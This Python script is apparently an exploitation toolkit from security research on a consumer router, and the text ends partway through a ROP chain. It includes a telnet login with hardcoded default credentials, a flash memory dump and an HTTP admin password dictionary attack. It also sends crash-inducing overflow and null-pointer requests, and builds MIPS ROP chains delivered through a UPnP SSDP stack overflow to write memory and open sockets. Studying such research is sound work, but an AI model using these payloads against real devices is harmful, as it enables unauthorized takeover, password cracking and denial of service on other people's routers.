import base64
import socket
#import telnetlib
import argparse
from cmds import command_dict
import time
import struct
from pwn import *

class ID:
    def __init__(self, module_id, command_id, type, unknown):
        self.id_bytes = []
        self.id_bytes.append(module_id)
        self.id_bytes.append(command_id)
        self.id_bytes.append(type)
        self.id_bytes.append(unknown)

    def to_int(self):
        return int.from_bytes(self.id_bytes, 'big')

    def to_string(self):
        return hex(int.from_bytes(self.id_bytes, 'big')).split('0x')[1]

# Logs in to the telnet interface
def telnet_login(tn, user, password):
    tn.read_until(b"Login as:")
    tn.write(user.encode() + b"\n")

    tn.read_until(b"Password:")
    tn.write(password.encode() + b"\n")

    print("[+] Logged in\n")

# Send a command to the telnet interface on the router, get first line and flush
def send_telnet_command_and_get_line(tn, command):
    # Send the command
    tn.write(command + b'\n')

    # Read the line
    output = tn.read_until(b'\r\n').decode()

    # Flush remaining output
    tn.read_until(b'>')

    # Close the connection
    return output

# Send a command to the telnet interface on the router, get output until end, flush rest
def send_telnet_command_and_read_until(tn, command, end):
    # Send the command
    tn.write(command + b'\n')

    # Read the output until specified end string
    return tn.read_until(end.encode()).decode()

# Dumps memory in chunks to minimise risk of malloc error
def dump_flash(tn):
    go_to_submenu(tn, 'os')

    print("[+] Starting data read")

    chip_size = 2097152
    chunks = 8

    with open("mem_dump.txt", "w") as dump_file:
        for i in range(chunks):
            start = hex(int((chip_size/chunks) * i))
            size = str(chip_size/chunks)
            cmd_string = f"spi rd {start} {size}\n"

            tn.write(cmd_string.encode('ascii'))

            output = tn.read_until(b'OS>').decode()

            print(f"[*] Read {(i+1)*chip_size/chunks} bytes out of {chip_size}")

            dump_file.write(output.split('\r\n\r\n')[0])
            dump_file.write('\n')

        dump_file.close()

# Converts the incoming txt file to binary file that can be loaded into Ghidra
def convert_txt_to_bin(input_path):
    print(f"[*] Starting conversion of file {input_path}")
    # Open the hexdump file in read mode
    with open(input_path, 'r') as f:
        # Open the output binary file in write mode
        with open('mem_dump.bin', 'wb') as out:
            l = 1

            # Iterate over each line in the hexdump file
            for line in f:
                try:
                    # Split the line into a list of strings using the space character as the delimiter
                    line_data = line.split(' ')

                    # Iterate over each string in the list
                    for data in line_data:
                        byte_list = []
                        for i in range(4):
                            # Convert the string to a hex byte and append it to the list
                            single_byte = bytes.fromhex(data[2*i:2*i+2])

                            byte_list.append(single_byte)
                        
                        # Reverse byte list to correct endian
                        for element in byte_list[::-1]:
                            out.write(element)
                    l += 1
                except Exception:
                    print(f"[-] Conversion failed on line {l} of input file, check it looks valid:\n    {line}")
                    exit(0)

    print(f"[+] Conversion completed successfully, output to mem_dump.bin")

# Goes to the desired submenu in the telnet cmd line
def go_to_submenu(tn, name):
    # Go to top of menu tree
    send_telnet_command_and_get_line(tn, b'cd ..')
    submenu_cmd = f"cd {name}\nls"
    send_telnet_command_and_get_line(tn, submenu_cmd.encode('ascii'))

# Gets all the hidden values that don't appear in the config dump (as well as the ones that do)
def get_all_config(tn):
    go_to_submenu(tn, 'cfg')

    print_with_padding('Decimal ID', False, 12)
    print_with_padding('Hex ID', False, 12)
    print_with_padding('Name', False, 30)
    print("Value")

    # Scan id's for entries not in config
    for i in range(0, 255):
        for j in range(0, 255):
            for k in range(1, 5):
                id = ID(i, j, k, 0)
                response = send_telnet_command_and_get_line(tn, b"get " + id.to_string().encode())

                # Check that a value has been returned
                if (('UNKNOWN' not in response) and ('Not Found' not in response)) and '=' in response:
                    print_with_padding(str(id.to_int()), False, 12)
                    print_with_padding(id.to_string(), False, 12)
                    print_with_padding(response.split('=')[0], False, 30)
                    print(response.split('=')[1].rstrip())
                    #print(f"command_dict['{response.split('=')[0]}'] = {str(id.to_int())}") # For generating dictionary
                    break # Can break as only 1 type for each id

# Prints passed data with specified padding
def print_with_padding(to_print, line_break, space):
    if line_break:
        print(to_print + (space-len(to_print)) * ' ')
    else:
        print(to_print + (space-len(to_print)) * ' ', end='')

# Gets the decimal id of the config value with the passed name
def get_id_by_name(name):
    for cmd_name in command_dict.keys():
        if name in cmd_name:
            return command_dict[cmd_name]

# Send POST request using password as auth, and with the payload
def http_send(ip, password, payload):
    # Construct the authorization
    authorization = f"admin:{password.rstrip()}"
    encoded_authorization = base64.b64encode(authorization.encode("utf-8")).decode("utf-8")

    # Build the request
    request = "POST /do_cmd.htm HTTP/1.1\r\n".encode('utf-8')
    #request += f"If-Modifed-Since: {'a'*380}, 28-{'a'*380}-2023 15:30:00 GMT\r\n".encode('utf-8')
    request += f"Authorization: Basic {encoded_authorization}\r\n".encode('utf-8')
    request += "Content-Type: application/x-www-form-urlencoded\r\n".encode('utf-8')
    request += f"Content-Length: {len(payload)}\r\n".encode('utf-8')
    request += "\r\n".encode('utf-8')
    request += payload
    print(request)
    

    # Create socket and connect
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((ip, 80))

    # Send the request
    s.sendall(request)

    # receive data from the server
    data = s.recv(512) 

    s.close()

    return data

def to_addr(addr):
    return struct.pack("L", addr)

# Try and crack the http admin password with provided wordlist
def crack_password(wordlist):
    # get local machine name
    ip = "192.168.188.1"

    # Start time
    start = time.time()

    # Iterate over the wordlist
    count = 0
    bars = 100

    print(f"[*] Wordlist size: {len(wordlist)}\n")
    print(f"0% {' ' * (bars-8)} 100%")

    bar_width = len(wordlist)/bars
    
    for password in wordlist:
        count += 1

        if int(count % bar_width) == 0:
            print('#', end='', flush=True)

        data = http_send(ip, password, '')

        if b"401" not in data:
            return password.rstrip() + f"\t\t{count/(time.time() - start)} pwd/sec"  


def write_memory(ip, addr, value):
    # Create the payload
    payload = b'a' * 132

    # Add the strings to the sX registers, and set the ra to first gadget
    payload += p32(value) # s0
    payload += p32(addr) # s1
    payload += p32(0x802C5268) # s2
    payload += p32(0x802ab9f4) # s3
    payload += p32(0x8013be14) # ra

    # 0x8013be14: sw $s0, ($s1); lw $ra, 0xc($sp); move $v0, $s0; lw $s2, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
    payload += p32(0x802c0404) # s0
    payload += p32(0x8025d504) # s1
    payload += p32(0x802C5268) # s2
    payload += p32(0x801888e8) # ra

    # Build the request
    request = b"M-SEARCH * HTTP/1.0\r\n"
    request += b"HOST:239.255.255.250:1900\r\n"
    request += b"ST:uuid:" + payload + b"\r\n"
    request += b"MX:2\r\n"
    request += b"MAN:\"ssdp:discover\"\r\n\r\n"

    print(f"Writing {hex(value)} to address {hex(addr)}")
    
    # Create socket and connect
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5)
    s.connect((ip, 1900))

    # Send the request
    s.sendall(request)
    s.close()  

    time.sleep(0.1)

# construct argparse
parser = argparse.ArgumentParser(
    prog='wodesys util',
    description='utils for wodesys router'
)

parser.add_argument('-ip', help='ip address', default='192.168.188.1', type=str)

subparsers = parser.add_subparsers(dest='command')

# construct telnet subparser
telnet_parser = subparsers.add_parser('telnet', help='telnet utils')
telnet_parser.add_argument('-s', '--scan', help='Scan for config values', action='store_true')
telnet_parser.add_argument('-d', '--dump', help='Dump the flash via OS spi command', action='store_true')
telnet_parser.add_argument('-u', '--username', help='Telnet username', default='root')
telnet_parser.add_argument('-p', '--password', help='Telnet password', default='cs2012')
telnet_parser.add_argument('-c', '--convert', help='Convert dumped text file to binary', metavar='file')
telnet_parser.add_argument('-m', '--msg', help='Message to send to telnet', metavar=('module', 'msg'), nargs=2)

# construct http subparser
http_parser = subparsers.add_parser('http', help='HTTP utils')
http_parser.add_argument('-d', '--dictionary', help='Dictionary attack for admin password using passed wordlist')
http_parser.add_argument('-s', '--set', help='Set config values via http request', nargs=3, metavar=('admin_pw', 'name', 'value'))
http_parser.add_argument('-f', '--find', help='Find config value name with substring search', type=str)
http_parser.add_argument('-p', '--payload', help='Payload to send as authenticated http request', type=str, nargs=2, metavar=('admin_pw', 'payload'))
http_parser.add_argument('-r', '--rop', help='Execute the ROP chain', type=str, nargs=1, metavar=('type'))
http_parser.add_argument('-c', '--crash', help='Cause a crash', type=str, nargs=2, metavar=('admin_pw', 'type'), default=('admin', '0'))
http_parser.add_argument('-sh', '--shellcode', help='Execute shellcode', type=str, nargs=1, metavar=('type'))

args = parser.parse_args()

# Use telnet utils
if args.command == 'telnet':
    # Convert input text file to binary
    if args.convert is not None:
        convert_txt_to_bin(args.convert)
        exit(0)
    # Create telnet instance
    tn = telnetlib.Telnet(args.ip)

    # Login with hardcoded creds
    telnet_login(tn, args.username, args.password)

    # Scan for config values and print
    if args.scan:
        get_all_config(tn)

    # Dump the flash with os spi command
    if args.dump:
        dump_flash(tn)

    # Sends a telnet command to the router
    if args.msg:
        go_to_submenu(tn, args.msg[0])
        print(send_telnet_command_and_read_until(tn, args.msg[1].encode(), args.msg[0].upper() + '>'))

    # Close telnet connection when finished
    tn.close()
elif args.command == 'http':
    if args.set is not None:
        try:
            id = int(args.set[1], 16)
        except ValueError:
            id = get_id_by_name(args.set[1])
        payload = f"CMD=SYS&SET0={id}%3D{args.set[2]}"

        print(f"[*] Setting config value with decimal id {id} to {args.set[2]}")
        print(f"[*] HTTP payload : {payload}")

        result = http_send(args.ip, args.set[0], payload)

        if b'200' in result:
            print("[+] Success")
        elif b'401' in result:
            print("\n[-] Failure, incorrect admin password")
    elif args.dictionary is not None:
        # Read in the wordlist from a file
        with open(args.dictionary, "r") as f:
            wordlist = f.readlines()

        # Call the password cracker function (136 passwords per second)
        password = crack_password(wordlist)

        # Print the password (if it was found)
        if password is not None:
            print(f"\n\n[+] Password found: {password}")
        else:
            print("\n\n[-] Password not found")
    elif args.find is not None:
        print(f"[*] Finding config entiries containing {args.find}\n")
        # Check names of all config names against query
        for name in command_dict.keys():
            # Get index of occurence (if there is one) to print green
            index = name.find(args.find)
            if index >= 0:
                print(name[:index], end='')
                print(f"\u001b[32m{args.find}\u001b[0m", end='')
                print(name[index+len(args.find):])
    elif args.payload is not None:
        print(f"[*] Sending HTTP payload : {args.payload[1]}")

        result = http_send(args.ip, args.payload[0], args.payload[1].encode('utf-8'))

        print("\n[+] Response:\n" + result.decode(), end='')

        if b'200' in result:
            print("[+] Success")
        elif b'401' in result:
            print("[-] Failure, incorrect admin password")
    elif args.crash[1] != '0':
        if args.crash[1] == '1':
            print("Config crash 1")
            # Send the malicious config value (without reloading the config)
            payload = b"CMD=SYS&GO=co_cmd.htm&SET0=71041536%3DAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
            result = http_send(args.ip, args.crash[0], payload)
            print(result)
            print("Remove power now to get the crash on next boot")
        elif args.crash[1] == '2':
            print("Config crash 2 (RT_ADD)")
            # Send the malicious config value (without reloading the config)
            payload = b"CMD=LANGUAGE_TYPE&GO=time.htm&SET0=83952129%3DAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
            result = http_send(args.ip, args.crash[0], payload)
            print(result)

            # Send the RT_ADD command immediately after to triger the overflow
            rt_add_payload = b"CMD=RT_ADD"
            result = http_send(args.ip, args.crash[0], rt_add_payload)
            print(result)
        elif args.crash[1] == '3':
            print("HTTP NPD 1")

            # Build the request
            request = b"POST / HTTP/1.1\r\n"
            request += b"User-Agent: MozillaFirefox\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((args.ip, 80))

            # Send the request
            s.sendall(request)
            s.close()
        elif args.crash[1] == '4':
            print("HTTP NPD 2")

            # Build the request
            request = b"POST / HTTP/1.1\r\n"
            request += b"User-Agent: MozillaFirefox\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((args.ip, 80))

            # Send the request
            s.sendall(request)
            s.close()
        elif args.crash[1] == '5':
            print("UPNP crash 1")

            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:uuid:" + b'a' * 132 + p32(0x800f9528) + p32(0x8025d502) + p32(0x802c5268) + p32(0x802ab9f4) + p32(0x801888e0) + b"\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"

            print(hexdump(request))
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            s.sendall(request)
            s.close()
        elif args.crash[1] == '6':
            print("UPNP crash 2")

            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:urn:schemas-upnp-org:service:"
            request += b'a'*200
            request += b":\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            s.sendall(request)
            s.close()
        elif args.crash[1] == '7':
            print("UPNP crash 3")

            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:urn:schemas-upnp-org:device:"
            request += b'a'*200
            request += b":\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            s.sendall(request)
            s.close()
        elif args.crash[1] == '8':
            print("UPNP crash 4")

            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:urn:schemas-wifialliance-org:service:"
            request += b'a'*200
            request += b":\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            s.sendall(request)
            s.close()
        elif args.crash[1] == '9':
            print("UPNP crash 5")

            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:urn:schemas-wifialliance-org:device:"
            request += b'a'*200
            request += b":\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            s.sendall(request)
            s.close()
        elif args.crash[1] == '10':
            print("HTTP NPD 3")

            # Build the request
            request = b"POST / HTTP/1.1\r\n"
            request += b'Content-Type: multipart/form-data\r\n'
            request += b"\r\n\r\n"
            request += b'CMD=SYS_UPG\r\n\r\n'
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((args.ip, 80))

            # Send the request
            s.sendall(request)
            s.close()
    elif args.rop:
        base_address = 0x80000400
        # Padding 
        chain = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3'

        # Useful addresses

        # Used at address 0x8015b398 in connect call so should work
        sockfd_addr = 0x802ab9c0 - 0x10
        sockaddr_addr = 0x802ab9c0 - 0x40
        pwd_buffer = 0x801d3754

        # for our sockaddr struct as we cant send null bytes
        harcdoded_afinet = 0x800f9528 # port 4900

        # Function address
        sendto_addr = 0x80128bc4
        socket_addr = 0x801293d0
        sleep_addr = 0x8019abac
        connect_addr = 0x80129028
        strlen_addr = 0x801a717c
        reboot_addr = 0x8000538c
        config_get_addr = 0x800089e4

        # Build the ROP chain
        if (args.rop[0] == '1'): # print 'hello_core.con' to uart/telnet command line
            ## print 'hello'
            # Add the strings to the sX registers, and set the ra to first gadget
            chain += p32(0x801d3754) # s0 ('hello')
            chain += p32(0x801c3f91) # s1 ("%s")
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # s3
            chain += p32(0x12ba10 + base_address) # ra
            
            # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x187a30 + base_address) # ra

            # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += b'a'*4
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0x57864 + base_address)

            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(0x8019a3a0) # v0 - printf address
            chain += b'a' * 8
            chain += p32(0x15114 + base_address) # ra

            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
            chain += b'a' * 4
            chain += p32(0x13478 + base_address) # ra

            ## print 'core.c'
            # 0x00013478: lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += b'b' * 4
            chain += p32(0x801d8faf) # s0 ('core.c')
            chain += p32(0x801c3f91) # s1 ("%s")
            chain += p32(0x12ba10 + base_address) # ra
            
            # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x187a30 + base_address) # ra

            # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += b'a'*4
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0x57864 + base_address)

            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(0x8019a3a0) # v0 - printf address
            chain += b'a' * 8
            chain += p32(0x15114 + base_address) # ra

            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
            chain += b'a' * 4
            chain += p32(0x13478 + base_address) # ra

            ## print 'on'
            # 0x00013478: lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += b'b' * 4
            chain += p32(0x801dcd98+0xa) # s0 ('on')
            chain += p32(0x801c3f91) # s1 ("%s")
            chain += p32(0x12ba10 + base_address) # ra
            
            # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x187a30 + base_address) # ra

            # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += b'a'*4
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0x57864 + base_address)

            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(0x8019a3a0) # v0 - printf address
            chain += b'a' * 8
            chain += p32(0x15114 + base_address) # ra

            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
            chain += b'a' * 4
            chain += p32(0xdecea5ed) # ra
        elif (args.rop[0] == '2'): # send 'hello' over TCP socket to some device listening on network (doesnt work :( )
            """
            // Trying to emulate this
            int main() {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                
                struct sockaddr_in server;
                server.sin_family = AF_INET;
                server.sin_addr.s_addr = inet_addr("192.168.188.2");
                server.sin_port = htons(4900);
                
                connect(sock, (struct sockaddr *)&server, sizeof(server));
                
                char message[] = "hello";
                send(sock, message, sizeof(message), 0);
                
                close(sock);
                return 0;
            }
            """

            # Add the strings to the sX registers, and set the ra to first gadget
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # s3
            chain += p32(0x11e670 + base_address) # ra

                # # Store the current stack pointer in a3
                # # 0x00014d14: move $a3, $sp; lw $ra, 0xc($sp); negu $v0, $v0; jr $ra; addiu $sp, $sp, 0x10; 
                # chain += b'b' * 0xc
                # chain += p32(0x11e670 + base_address) # ra

            ####################################################################
            ########## int socket(int domain, int type, int protocol); #########
            ####################################################################

            # set first argument for socket to 2
            # 0x0011e670: addiu $a0, $zero, 2; lw $ra, 4($sp); move $v0, $zero; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += b'b'*4
            chain += p32(0x25b9c + base_address) # ra

            # set second argument for socket to 1
            # 0x00025b9c: addiu $a1, $zero, 1; lw $ra, 0xc($sp); lw $s0, 8($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += b'a' * 8
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x6d42c + base_address) # ra

            # set third argument for socket to 0
            # 0x0006d42c: move $a2, $zero; lw $ra, 4($sp); addiu $v0, $zero, 1; jr $ra; addiu $sp, $sp, 8;
            chain += b'a' * 4
            chain += p32(0x57864 + base_address) # ra

                    ##### Didn't work because branch delay slot :'(
                    # # 0x00073930: lw $v1, ($sp); lw $ra, 0xc($sp); move $v0, $s0; lw $s0, 8($sp); jr $ra; addiu $sp, $sp, 0x10;
                    # chain += p32(0xffffffff) # v1 - socket address
                    # chain += b'a' * 4
                    # chain += p32(0xdecea5ed) # s0
                    # chain += p32(0x175e34 + base_address) # ra

                    # # 0x00175e34: jalr $v1; ori $a1, $a1, 0x6934; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
                    # chain += b'b' * 0xc
                    # chain += p32(0xdeadb00f) # ra

                    ##### Didn't work because 2nd gadget clears v0 so we don't know the file descriptor of the socket cringe
                    # # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
                    # chain += p32(socket_addr) # v1 - socket address
                    # chain += b'a' * 8
                    # chain += p32(0x15114 + base_address) # ra

                    # # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
                    # chain += b'b' * 4
                    # chain += p32(0xdecea5ed)

            # Load address of socket into v0
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(socket_addr) # v0 - socket address
            chain += b'b' * 8
            chain += p32(0x133d58 + base_address) # ra

            # Call socket(2, 1, 0) and regain control
            # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28;
            chain += b'b' * 0x18
            chain += p32(sockfd_addr) # s0
            chain += p32(sockaddr_addr) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0x185e38 + base_address) # ra

            # save the socket file descriptor for use later, might not use but oh well
            # 0x00185e38: sw $v0, ($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x1746c8 + base_address) # ra

            ###############################################################################################
            ######### int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); ############
            ###############################################################################################

            # Move sockfd to a0 for connect
            # 0x001746c8: move $a0, $v0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(harcdoded_afinet) # s0
            chain += p32(0x57864 + base_address) # ra

            # s0 is our hardcoded ifnet address, s1 is our sockaddr address
            # Need to copy 4 bytes at s0 to 4 bytes at s1, load address of afinet into v0
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
            chain += p32(harcdoded_afinet) # v0
            chain += b'b' * 8
            chain += p32(0x1a46dc + base_address)

            # Load hardcoded afinet stuff into v0 (currently has the address)
            # 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
            chain += b'b' * 4
            chain += p32(0x13e134 + base_address)

            # Store the afinet stuff at our sockaddr struct
            # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18; 
            chain += b'b' * 4
            chain += p32(0xdecea5ed) # s0
            chain += p32(sockaddr_addr + 4) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # s3
            chain += p32(0x57864 + base_address) # ra

            # Load the IP address into v0
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
            chain += struct.pack('>BBBB', 192, 168, 188, 2) # v0, IP
            chain += b'b' * 8
            chain += p32(0x13e134 + base_address) # ra

            # Store the loaded IP address at sockaddr + 4
            # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18;
            chain += b'b' * 4
            chain += p32(sockaddr_addr) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # s3
            chain += p32(0x1882bc + base_address) # ra

            # Move the sockaddr struct to a1
            # 0x001882bc: move $a1, $s0; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10; 
            chain += b'b' * 4
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0x612d0 + base_address) # ra   

            # 0x000612d0: addiu $a2, $zero, 0x20; lw $ra, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x18;
            chain += b'b' * 0xc
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0x57864 + base_address) # ra

            # Load address of connect into v0
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(connect_addr) # v0 - connect address
            chain += b'b' * 8
            chain += p32(0x133d58 + base_address) # ra

            # Call socket(2, 1, 0) and regain control
            # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28;
            chain += b'b' * 0x18
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # ra
        elif (args.rop[0] == '3'): # send 'hello' over udp socket to some device
            # Add the strings to the sX registers, and set the ra to first gadget
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # s3
            chain += p32(0x11e670 + base_address) # ra

            ####################################################################
            ########## int socket(int domain, int type, int protocol); #########
            ####################################################################

            # Set first argument for socket to 2
            # 0x0011e670: addiu $a0, $zero, 2; lw $ra, 4($sp); move $v0, $zero; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += b'b'*4
            chain += p32(0x172e0c + base_address) # ra

            # Set second argument for socket to 2 
            # 0x00172e0c: move $a1, $zero; lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
            chain += b'b' * 0xc
            chain += p32(0x115428 + base_address)

            # 0x00115428: addiu $a1, $a1, 2; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x6d42c + base_address)

            # set third argument for socket to 0
            # 0x0006d42c: move $a2, $zero; lw $ra, 4($sp); addiu $v0, $zero, 1; jr $ra; addiu $sp, $sp, 8;
            chain += b'b' * 4
            chain += p32(0x57864 + base_address) # ra

            # Load address of socket into v0
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(socket_addr) # v0 - socket address
            chain += b'b' * 8
            chain += p32(0x133d58 + base_address) # ra

            # Call socket(2, 2, 0) and regain control
